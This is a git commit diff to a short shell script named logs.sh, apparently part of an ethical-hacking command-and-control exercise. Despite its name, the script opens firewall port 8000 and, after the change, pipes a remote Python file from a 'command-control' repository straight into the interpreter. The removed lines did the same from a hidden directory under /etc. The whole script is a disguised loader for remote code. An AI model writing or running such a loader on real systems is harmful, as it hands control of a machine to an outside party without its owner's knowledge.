1498137d1890bdf2fb971e6907ee90ca9f9a99f6
AidanNgo <115433593+AidanNgo@users.noreply.github.com>
2026-03-26 21:23:05 -0500

    Update logs.sh

--- logs.sh
+++ logs.sh
@@ -1,6 +1,4 @@
 #!/bin/bash
-cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
 firewall-cmd --reload  
-curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/week4.py -o week4.py
-/usr/bin/python week4.py
+curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/week4.py | python
